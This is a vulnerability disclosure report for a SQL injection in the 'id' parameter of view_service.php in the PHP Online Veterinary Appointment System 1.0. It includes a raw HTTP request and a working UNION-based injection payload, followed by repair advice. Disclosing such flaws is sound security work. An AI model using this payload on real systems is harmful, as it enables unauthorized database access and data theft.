# sourcecodester.com"Online Veterinary Appointment System" in PHP 1.0 "view_service.php" SQL injection

# BUG_AUTHOR：Yang YiLing

# NAME OF AFFECTED PRODUCT(S)
- Online Veterinary Appointment System using PHP/OOP Free Source Code

## Vendor Homepage
https://www.sourcecodester.com/php/15119/online-veterinary-appointment-system-using-phpoop-free-source-code.html

# AFFECTED AND/OR FIXED VERSION(S)

## submitter
- Yang YiLing
## Vulnerable File
- /ovas/admin/services/view_service.php
## VERSION(S)
- V1.0

## Software Link
https://www.sourcecodester.com/download-code?nid=15119&title=Online+Veterinary+Appointment+System+using+PHP%2FOOP+Free+Source+Code

# PROBLEM TYPE
## Vulnerability Type
- SQL injection
## Root Cause
- A SQL injection vulnerability was found in the 'view_service.php' file of the 'Online Veterinary Appointment System' project. The reason for this issue is that attackers inject malicious code from the parameter "id" and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact
- Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION
- During the security review of the PHP "Online Veterinary Appointment System", "Yang YiLing" discovered a critical SQL injection vulnerability in the "view_service.php" file. This vulnerability stems from insufficient user input validation of the "id" parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# login or authorization is required to exploit this vulnerability
# Vulnerability details and POC
```sql
GET /ovas/admin/services/view_service.php?id=-4%27%20union%20select%201,2,database(),4,5,6,7,8--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=i9equpjmuu8ha113o4sn8hf0cv
Connection: close
```
## Vulnerability type:
- UNION query

## Vulnerability location:
- 'id' parameter
## Payload:
<hr>
Payload: /ovas/admin/services/view_service.php?id=-4' union select 1,2,database(),4,5,6,7,8--+

![image](https://github.com/user-attachments/assets/97e047c4-6941-4588-9250-3a1559447467)

<hr>

![image](https://github.com/user-attachments/assets/4e42a852-4bcb-4408-8363-6f11d3e34141)

# Suggested repair
1. Use prepared statements and parameter binding:
   
   Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

3. Input validation and filtering:
   
   Strictly validate and filter user input data to ensure it conforms to the expected format.

5. Minimize database user permissions:
   
   Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.

7. Regular security audits:
   
   Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.
